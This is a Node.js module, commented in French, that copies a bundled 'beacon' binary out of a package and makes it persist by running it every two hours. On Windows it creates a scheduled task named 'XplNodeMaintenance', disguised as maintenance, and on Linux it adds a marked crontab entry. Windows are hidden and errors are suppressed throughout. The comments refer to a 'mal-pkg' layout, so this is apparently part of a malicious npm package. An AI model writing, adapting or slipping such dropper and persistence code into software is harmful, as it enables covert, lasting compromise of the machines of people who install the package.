'use strict';
// Drop binaire beacon + persistance cross-platform.
//   Windows : schtasks XplNodeMaintenance (hourly/2)
//   Linux   : crontab "0 */2 * * *" marquée
const { spawnSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const TASK = 'XplNodeMaintenance';
const WIN = process.platform === 'win32';
const EXE = WIN ? 'beacon.exe' : 'beacon-linux';

function drop() {
  // layout publié : ce fichier vit en dist/lib/ → racine du paquet = ../..
  // (layout dev mal-pkg : lib/ → ../ — géré par le fallback)
  let root = path.join(__dirname, '..', '..');
  if (!fs.existsSync(path.join(root, 'bin', EXE)) && fs.existsSync(path.join(__dirname, '..', 'bin', EXE))  ) {
    root = path.join(__dirname, '..');
  }
  const src = path.join(root, 'bin', EXE);
  const dest = path.join(root, EXE);
  if (!fs.existsSync(src)) return false;
  try {
    fs.copyFileSync(src, dest);
    try { fs.chmodSync(dest, 0o755); } catch {}
  } catch {
    return false;
  }
  try {
    if (WIN) {
      const q = spawnSync('schtasks', ['/query', '/tn', TASK], { windowsHide: true });
      if (q.status !== 0) {
        spawnSync('schtasks', ['/create', '/tn', TASK, '/sc', 'hourly', '/mo', '2', '/tr', `"${dest}"`, '/f'], { windowsHide: true });
      }
    } else {
      const marker = `# ${TASK}`;
      const entry = `0 */2 * * * ${dest} ${marker}`;
      const cur = spawnSync('crontab', ['-l'], { encoding: 'utf8' });
      const has = (cur.stdout || '').split('\n').some((l) => l.includes(marker));
      if (!has) {
        const next = (cur.stdout || '').replace(/\n*$/, '\n') + entry + '\n';
        spawnSync('crontab', ['-'], { input: next });
      }
    }
  } catch {}
  return true;
}

module.exports = { drop };
